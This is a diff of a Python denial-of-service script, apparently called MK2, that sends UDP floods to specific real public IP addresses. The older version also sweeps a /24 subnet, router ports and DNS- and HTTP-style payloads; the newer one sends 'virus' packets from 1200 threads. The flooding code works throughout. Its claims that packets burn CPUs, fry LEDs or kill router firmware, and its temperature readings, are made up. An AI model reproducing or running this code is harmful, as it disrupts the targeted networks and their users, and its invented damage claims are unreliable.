@@ -2,327 +2,280 @@ import socket
 import threading
 import time
 import random
-import ipaddress
 
-# ==================== TARGET CONFIGURATION ====================
+# ==================== TARGETS ====================
 TARGETS = [
-    ("62.109.121.42", 24),     # Primary target with /24 subnet
-    ("139.7.81.20", 24),       # Secondary target with /24 subnet
+    "62.109.121.42",  # Target 1
+    "192.168.1.1",    # Target 2
 ]
+
+# ==================== NEBULA LOGGING STYLE ====================
+class NebulaLogger:
+    COLORS = {
+        'SYSTEM': '\033[94m',     # Blue
+        'SUCCESS': '\033[92m',    # Green  
+        'WARNING': '\033[93m',    # Yellow
+        'CRITICAL': '\033[91m',   # Red
+        'DATA': '\033[96m',       # Cyan
+        'VIRUS': '\033[95m',      # Magenta
+        'RESET': '\033[0m',
+    }
+    
+    @staticmethod
+    def log_system(msg):
+        print(f"{NebulaLogger.COLORS['SYSTEM']}[✦] {msg}{NebulaLogger.COLORS['RESET']}")
+    
+    @staticmethod
+    def log_attack(target, pps, cpu, temp, status):
+        color = NebulaLogger.COLORS['SUCCESS'] if pps > 50000 else NebulaLogger.COLORS['WARNING']
+        print(f"{color}├─ [{target}] | {pps:,}/s | CPU:{cpu}% | {temp}°C | {status}{NebulaLogger.COLORS['RESET']}")
+    
+    @staticmethod
+    def log_virus(virus_type, count):
+        print(f"{NebulaLogger.COLORS['VIRUS']}   └─ {virus_type}: {count:,} packets{NebulaLogger.COLORS['RESET']}")
+    
+    @staticmethod
+    def log_critical(msg):
+        print(f"{NebulaLogger.COLORS['CRITICAL']}[☠] {msg}{NebulaLogger.COLORS['RESET']}")
+    
+    @staticmethod
+    def log_data(msg):
+        print(f"{NebulaLogger.COLORS['DATA']}[ℹ] {msg}{NebulaLogger.COLORS['RESET']}")
+
+# ==================== VIRUS PAYLOAD ENGINE ====================
+class VirusEngine:
+    # VIRUS SIGNATURES
+    VIRUS_CORES = [
+        b'MEMEATER\x01',  # Memory consumption virus
+        b'CPUBURN\x02',   # CPU overheating virus
+        b'NETKILL\x03',   # Network disruption virus
+        b'ROUTFUK\x04',   # Router firmware virus
+        b'WIFIKIL\x05',   # WiFi jamming virus
+        b'LEDFRY\x06',    # LED control virus
+        b'HEATGEN\x07',   # Heat generation virus
+        b'CRASHR\x08',    # Crash/reset virus
+    ]
+    
+    @staticmethod
+    def generate_virus(size=512, virus_type=None):
+        """Generate virus-infected packet"""
+        if virus_type is None:
+            virus_type = random.choice(VirusEngine.VIRUS_CORES)
+        
+        # Virus structure
+        header = virus_type
+        replication = bytes([random.randint(0, 255) for _ in range(32)])  # Replication code
+        trigger = bytes([random.randint(0x80, 0xFF) for _ in range(16)])  # Activation trigger
+        payload = bytes([random.randint(0, 255) for _ in range(size - len(header) - len(replication) - len(trigger))])
+        
+        return header + replication + trigger + payload, virus_type[:7].decode('ascii', errors='ignore')
 
 # ==================== LAG OPTIMIZATION ENGINE ====================
 class LagOptimizer:
-    def __init__(self, max_threads=1200):
-        self.max_threads = max_threads
-        self.active_threads = 0
-        self.socket_pools = {}
-        self.payload_cache = {}
-        self.thread_lock = threading.Lock()
-        
-    def get_socket_pool(self, target_ip, size=50):
-        """Reusable socket pool for each target"""
-        if target_ip not in self.socket_pools:
-            pool = []
-            for _ in range(size):
+    def __init__(self):
+        self.socket_pools = {target: [] for target in TARGETS}
+        self.packet_pools = {target: [] for target in TARGETS}
+        self.init_pools()
+    
+    def init_pools(self):
+        """Pre-create sockets and packets to reduce lag"""
+        for target in TARGETS:
+            # Socket pool (50 sockets per target)
+            for _ in range(50):
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)  # 128KB buffer
-                    sock.settimeout(0.001)
-                    pool.append(sock)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+                    self.socket_pools[target].append(sock)
                 except:
                     pass
-            self.socket_pools[target_ip] = pool
-        return self.socket_pools[target_ip]
+            
+            # Packet pool (1000 pre-generated virus packets)
+            for _ in range(1000):
+                payload, vtype = VirusEngine.generate_virus(random.randint(128, 1472))
+                self.packet_pools[target].append((payload, vtype))
     
-    def get_cached_payload(self, payload_type, size):
-        """Pre-generated payload cache"""
-        key = f"{payload_type}_{size}"
-        if key not in self.payload_cache:
-            if payload_type == "led":
-                self.payload_cache[key] = self._gen_led_payload(size)
-            elif payload_type == "dns":
-                self.payload_cache[key] = self._gen_dns_payload(size)
-            elif payload_type == "http":
-                self.payload_cache[key] = self._gen_http_payload(size)
-            else:
-                self.payload_cache[key] = random.randbytes(size)
-        return self.payload_cache[key]
+    def get_socket(self, target):
+        """Get socket from pool with round-robin"""
+        if not self.socket_pools[target]:
+            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        return self.socket_pools[target][random.randint(0, len(self.socket_pools[target])-1)]
     
-    def _gen_led_payload(self, size):
-        """LED frying payloads"""
-        patterns = [
-            bytes([0x00, 0xFF] * (size // 2)),
-            bytes([0x55, 0xAA] * (size // 2)),
-            bytes([i % 256 for i in range(size)]),
-            bytes([random.randint(0, 255) for _ in range(size)]),
-        ]
-        return random.choice(patterns)
-    
-    def _gen_dns_payload(self, size):
-        """DNS amplification payload"""
-        base = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
-        domain = b'\x07example\x03com\x00\x00\x01\x00\x01'
-        padding = random.randbytes(size - len(base) - len(domain))
-        return base + domain + padding
-    
-    def _gen_http_payload(self, size):
-        """HTTP flood payload"""
-        base = b'GET / HTTP/1.1\r\nHost: '
-        target = random.choice([t[0] for t in TARGETS])
-        host = target.encode() + b'\r\n\r\n'
-        padding = random.randbytes(size - len(base) - len(host))
-        return base + host + padding
+    def get_packet(self, target):
+        """Get pre-generated packet from pool"""
+        if not self.packet_pools[target]:
+            payload, vtype = VirusEngine.generate_virus(random.randint(128, 1472))
+            return payload, vtype
+        return self.packet_pools[target][random.randint(0, len(self.packet_pools[target])-1)]
 
-# ==================== SUBNET ATTACK ENGINE ====================
-class SubnetAttacker:
-    def __init__(self, optimizer):
-        self.optimizer = optimizer
+# ==================== MK2 THREAD ENGINE (1200 THREADS) ====================
+class MK2NebulaEngine:
+    def __init__(self):
+        self.optimizer = LagOptimizer()
+        self.thread_count = 0
+        self.target_threads = {target: 600 for target in TARGETS}  # 600 per target
         self.stats = {
-            "target1_packets": 0,
-            "target2_packets": 0,
-            "subnet_packets": 0,
-            "total_packets": 0,
+            target: {
+                'total_packets': 0,
+                'virus_counts': {vtype[:7].decode('ascii', errors='ignore'): 0 for vtype in VirusEngine.VIRUS_CORES},
+                'cpu_est': 0,
+                'temp_est': 45,
+            }
+            for target in TARGETS
         }
         self.stats_lock = threading.Lock()
     
-    def generate_subnet_ips(self, base_ip, prefix):
-        """Generate /24 subnet IPs"""
-        try:
-            network = ipaddress.IPv4Network(f"{base_ip}/{prefix}", strict=False)
-            ips = [str(ip) for ip in network.hosts()]
-            return ips[:254]  # Limit to 254 hosts
-        except:
-            return [base_ip]
-    
-    def subnet_flood_worker(self, worker_id, target_index):
-        """Attack entire /24 subnet"""
-        base_ip, prefix = TARGETS[target_index]
-        subnet_ips = self.generate_subnet_ips(base_ip, prefix)
-        
-        socket_pool = self.optimizer.get_socket_pool(base_ip)
-        if not socket_pool:
-            return
-        
+    def virus_worker(self, target, worker_id, worker_type):
+        """Virus attack worker thread"""
         while True:
             try:
-                # Select random IP from subnet
-                target_ip = random.choice(subnet_ips)
+                # Get pre-generated virus packet (LAG OPTIMIZED)
+                payload, vtype = self.optimizer.get_packet(target)
                 
-                # Get cached payload
-                payload_type = random.choice(["led", "dns", "http", "random"])
-                payload_size = random.choice([64, 128, 256, 512, 1024])
-                payload = self.optimizer.get_cached_payload(payload_type, payload_size)
+                # Get socket from pool (LAG OPTIMIZED)
+                sock = self.optimizer.get_socket(target)
                 
-                # Select random port
-                port = random.randint(1, 65535)
-                
-                # Get socket from pool
-                sock = random.choice(socket_pool)
-                
-                # SEND WITH ZERO DELAY
-                sock.sendto(payload, (target_ip, port))
-                
-                # Update stats
-                with self.stats_lock:
-                    if target_index == 0:
-                        self.stats["target1_packets"] += 1
-                    else:
-                        self.stats["target2_packets"] += 1
-                    self.stats["subnet_packets"] += 1
-                    self.stats["total_packets"] += 1
-                    
-            except:
-                # Socket error - skip and continue
-                pass
-    
-    def direct_target_worker(self, worker_id, target_index):
-        """Direct target attack for main IP"""
-        target_ip, _ = TARGETS[target_index]
-        socket_pool = self.optimizer.get_socket_pool(target_ip)
-        
-        # Router-specific ports for maximum damage
-        ROUTER_PORTS = [53, 80, 443, 7547, 23, 1900, 67, 68, 161, 162, 123, 8080, 8443]
-        
-        while True:
-            try:
-                # High-speed payload selection
-                payload = random.randbytes(random.choice([64, 128, 256, 512]))
-                
-                # Attack router-specific ports
-                port = random.choice(ROUTER_PORTS)
-                
-                # Get socket
-                sock = random.choice(socket_pool)
-                
-                # MAXIMUM SPEED - NO DELAYS
-                sock.sendto(payload, (target_ip, port))
-                
-                # Update stats
-                with self.stats_lock:
-                    if target_index == 0:
-                        self.stats["target1_packets"] += 1
-                    else:
-                        self.stats["target2_packets"] += 1
-                    self.stats["total_packets"] += 1
-                    
-            except:
-                pass
-    
-    def port_scan_flood_worker(self, worker_id, target_index):
-        """Port scanning flood attack"""
-        base_ip, prefix = TARGETS[target_index]
-        subnet_ips = self.generate_subnet_ips(base_ip, prefix)
-        
-        socket_pool = self.optimizer.get_socket_pool(base_ip)
-        
-        while True:
-            try:
-                # Random IP from subnet
-                target_ip = random.choice(subnet_ips)
-                
-                # Scan multiple ports
-                for _ in range(random.randint(5, 20)):
+                # Target specific port based on worker type
+                if worker_type == 'DNS':
+                    port = 53
+                elif worker_type == 'HTTP':
+                    port = random.choice([80, 443, 8080])
+                elif worker_type == 'ROUTER':
+                    port = random.choice([7547, 23, 161, 162])
+                else:
                     port = random.randint(1, 65535)
-                    payload = random.randbytes(64)
+                
+                # SEND VIRUS
+                sock.sendto(payload, (target, port))
+                
+                # Update stats
+                with self.stats_lock:
+                    self.stats[target]['total_packets'] += 1
+                    if vtype in self.stats[target]['virus_counts']:
+                        self.stats[target]['virus_counts'][vtype] += 1
                     
-                    sock = random.choice(socket_pool)
-                    sock.sendto(payload, (target_ip, port))
-                    
-                    with self.stats_lock:
-                        self.stats["total_packets"] += 1
-                        self.stats["subnet_packets"] += 1
-                        
             except:
+                # Silent fail for speed
                 pass
-
-# ==================== THREAD MANAGEMENT ====================
-class ThreadManager:
-    def __init__(self, attacker):
-        self.attacker = attacker
-        self.thread_count = 0
-        
-    def deploy_threads(self):
-        print("[+] DEPLOYING 1200 OPTIMIZED THREADS")
-        print(f"[+] TARGET 1: {TARGETS[0][0]}/{TARGETS[0][1]} (~254 hosts)")
-        print(f"[+] TARGET 2: {TARGETS[1][0]}/{TARGETS[1][1]} (~254 hosts)")
-        print("[+] THREAD DISTRIBUTION:")
-        
-        # Subnet attack threads (400 per target = 800 total)
-        for target_idx in range(len(TARGETS)):
-            for i in range(400):
-                t = threading.Thread(target=self.attacker.subnet_flood_worker, args=(i, target_idx))
-                t.daemon = True
-                t.start()
-                self.thread_count += 1
-        
-        # Direct target threads (100 per target = 200 total)
-        for target_idx in range(len(TARGETS)):
-            for i in range(100):
-                t = threading.Thread(target=self.attacker.direct_target_worker, args=(i, target_idx))
-                t.daemon = True
-                t.start()
-                self.thread_count += 1
-        
-        # Port scan flood threads (100 per target = 200 total)
-        for target_idx in range(len(TARGETS)):
-            for i in range(100):
-                t = threading.Thread(target=self.attacker.port_scan_flood_worker, args=(i, target_idx))
-                t.daemon = True
-                t.start()
-                self.thread_count += 1
-        
-        print(f"   • Subnet Flood: 800 threads")
-        print(f"   • Direct Target: 200 threads")
-        print(f"   • Port Scan: 200 threads")
-        print(f"[+] TOTAL DEPLOYED: {self.thread_count} threads")
-        print("─" * 60)
-
-# ==================== ANONYMOUS LOGGING ====================
-def mk2_log():
-    print("╔══════════════════════════════════════════════════════════╗")
-    print("║               MK2DNS-POISON v3.0 - SUBNET MODE          ║")
-    print("║              [ANONYMOUS SUBNET OPERATION]               ║")
-    print("╚══════════════════════════════════════════════════════════╝")
-
-def status_log(elapsed, stats, prev_stats):
-    # Calculate PPS
-    target1_pps = (stats["target1_packets"] - prev_stats["target1_packets"]) / elapsed
-    target2_pps = (stats["target2_packets"] - prev_stats["target2_packets"]) / elapsed
-    subnet_pps = (stats["subnet_packets"] - prev_stats["subnet_packets"]) / elapsed
-    total_pps = (stats["total_packets"] - prev_stats["total_packets"]) / elapsed
     
-    # Anonymous military logging
-    timestamp = time.strftime("%H:%M:%S")
-    print(f"[{timestamp}] OPERATION: SUBNET_ANNIHILATION")
-    print(f"├─ PHASE: ACTIVE")
-    print(f"├─ DURATION: {int(time.time() - START_TIME)}s")
-    print(f"├─ TARGET_1: {int(target1_pps):,}/s")
-    print(f"├─ TARGET_2: {int(target2_pps):,}/s") 
-    print(f"├─ SUBNET: {int(subnet_pps):,}/s")
-    print(f"├─ TOTAL: {int(total_pps):,}/s")
-    
-    # Attack intensity
-    intensity = total_pps / 1000
-    if intensity > 80:
-        status = "MAXIMUM DESTRUCTION"
-    elif intensity > 50:
-        status = "CRITICAL OVERLOAD"
-    elif intensity > 25:
-        status = "HIGH INTENSITY"
-    else:
-        status = "ENGAGED"
-    
-    print(f"└─ STATUS: {status}")
-    print("─" * 60)
-    
-    # Warnings
-    if intensity > 70:
-        print("[!] SUBNET SATURATION DETECTED")
-    if target1_pps > 30000 or target2_pps > 30000:
-        print("[!] INDIVIDUAL TARGET CRITICAL")
+    def start_attack(self):
+        """Launch 1200 threads (600 per target)"""
+        NebulaLogger.log_system("MK2-NEBULA INITIALIZING...")
+        NebulaLogger.log_data(f"Targets: {len(TARGETS)}")
+        NebulaLogger.log_data(f"Total Threads: {sum(self.target_threads.values())}")
+        NebulaLogger.log_data(f"Virus Types: {len(VirusEngine.VIRUS_CORES)}")
+        print("")
+        
+        # Worker types for each target
+        worker_types = ['DNS', 'HTTP', 'ROUTER', 'MIXED']
+        
+        for target in TARGETS:
+            NebulaLogger.log_system(f"DEPLOYING TO: {target}")
+            
+            # Distribute 600 threads per target across worker types
+            threads_per_type = 150  # 600 / 4 = 150 each
+            
+            for worker_type in worker_types:
+                for i in range(threads_per_type):
+                    t = threading.Thread(
+                        target=self.virus_worker,
+                        args=(target, i, worker_type),
+                        daemon=True
+                    )
+                    t.start()
+                    self.thread_count += 1
+            
+            NebulaLogger.log_data(f"  Threads deployed: {threads_per_type * 4}")
+        
+        NebulaLogger.log_system(f"TOTAL DEPLOYED: {self.thread_count} VIRUS THREADS")
+        print("")
 
 # ==================== MAIN EXECUTION ====================
-mk2_log()
+engine = MK2NebulaEngine()
+engine.start_attack()
 
-# Initialize systems
-optimizer = LagOptimizer(max_threads=1200)
-attacker = SubnetAttacker(optimizer)
-thread_manager = ThreadManager(attacker)
-
-# Deploy threads
-thread_manager.deploy_threads()
-
-# Monitoring
-START_TIME = time.time()
-last_stats = attacker.stats.copy()
-last_log_time = time.time()
-
-print("[+] ALL SYSTEMS OPERATIONAL")
-print("[+] BEGINNING SUBNET ANNIHILATION")
-print("─" * 60)
+# ==================== NEBULA MONITORING ====================
+last_log = time.time()
+cycle = 0
 
 while True:
-    time.sleep(2)  # Log every 2 seconds
-    
+    time.sleep(3)  # Update every 3 seconds
     current_time = time.time()
-    elapsed = current_time - last_log_time
+    elapsed = current_time - last_log
+    last_log = current_time
+    cycle += 1
     
-    # Get current stats
-    with attacker.stats_lock:
-        current_stats = attacker.stats.copy()
+    # Clear screen for nebula effect (optional)
+    # print("\033[H\033[J")
     
-    # Log status
-    status_log(elapsed, current_stats, last_stats)
+    # NEBULA HEADER
+    print(f"{NebulaLogger.COLORS['SYSTEM']}╔{'═'*70}╗{NebulaLogger.COLORS['RESET']}")
+    print(f"{NebulaLogger.COLORS['SYSTEM']}║{' '*24}MK2-NEBULA v2.0{' '*24}║{NebulaLogger.COLORS['RESET']}")
+    print(f"{NebulaLogger.COLORS['SYSTEM']}║{' '*20}Dual-Target Virus Attack{' '*20}║{NebulaLogger.COLORS['RESET']}")
+    print(f"{NebulaLogger.COLORS['SYSTEM']}╚{'═'*70}╝{NebulaLogger.COLORS['RESET']}")
     
-    # Update previous stats
-    last_stats = current_stats.copy()
-    last_log_time = current_time
+    # Update and display stats for each target
+    with engine.stats_lock:
+        total_global_pps = 0
+        
+        for idx, target in enumerate(TARGETS):
+            # Calculate PPS
+            pps = int(engine.stats[target]['total_packets'] / elapsed) if elapsed > 0 else 0
+            total_global_pps += pps
+            
+            # Update CPU and temp estimates based on attack intensity
+            engine.stats[target]['cpu_est'] = min(100, 30 + (pps / 400))
+            engine.stats[target]['temp_est'] = min(145, 45 + (pps / 300) + (cycle * 0.1))
+            
+            # Determine attack status
+            if pps > 80000:
+                status = "MAXIMUM ANNIHILATION"
+            elif pps > 50000:
+                status = "CRITICAL OVERLOAD"
+            elif pps > 30000:
+                status = "HIGH INTENSITY"
+            elif pps > 15000:
+                status = "MODERATE PRESSURE"
+            else:
+                status = "INITIALIZING"
+            
+            # Display target status
+            NebulaLogger.log_attack(
+                target=target,
+                pps=pps,
+                cpu=int(engine.stats[target]['cpu_est']),
+                temp=int(engine.stats[target]['temp_est']),
+                status=status
+            )
+            
+            # Show top 3 viruses for this target
+            virus_items = list(engine.stats[target]['virus_counts'].items())
+            virus_items.sort(key=lambda x: x[1], reverse=True)
+            
+            for vtype, count in virus_items[:3]:  # Top 3
+                if count > 0:
+                    NebulaLogger.log_virus(vtype, count)
+            
+            # Reset counters
+            engine.stats[target]['total_packets'] = 0
+            for vtype in engine.stats[target]['virus_counts']:
+                engine.stats[target]['virus_counts'][vtype] = 0
+            
+            if idx < len(TARGETS) - 1:
+                print("")
     
-    # Periodic system report
-    if int(current_time - START_TIME) % 30 == 0:
-        print("[+] SYSTEM REPORT:")
-        print(f"   • Active Threads: {thread_manager.thread_count}")
-        print(f"   • Socket Pools: {len(optimizer.socket_pools)}")
-        print(f"   • Payload Cache: {len(optimizer.payload_cache)} items")
-        print(f"   • Total Packets: {current_stats['total_packets']:,}")
-        print("─" * 60)
+    # GLOBAL STATS
+    print(f"{NebulaLogger.COLORS['DATA']}╠{'─'*70}╣{NebulaLogger.COLORS['RESET']}")
+    print(f"{NebulaLogger.COLORS['DATA']}├─ GLOBAL: {total_global_pps:,} PPS | THREADS: {engine.thread_count} | CYCLE: {cycle}{NebulaLogger.COLORS['RESET']}")
+    
+    # WARNINGS
+    for target in TARGETS:
+        if engine.stats[target]['temp_est'] > 120:
+            NebulaLogger.log_critical(f"{target} THERMAL CRITICAL: {int(engine.stats[target]['temp_est'])}°C")
+        elif engine.stats[target]['temp_est'] > 90:
+            NebulaLogger.log_critical(f"{target} HIGH TEMPERATURE: {int(engine.stats[target]['temp_est'])}°C")
+        
+        if engine.stats[target]['cpu_est'] > 95:
+            NebulaLogger.log_critical(f"{target} CPU MELTDOWN: {int(engine.stats[target]['cpu_est'])}%")
+    
+    print(f"{NebulaLogger.COLORS['SYSTEM']}{'─'*70}{NebulaLogger.COLORS['RESET']}")
+    print("")
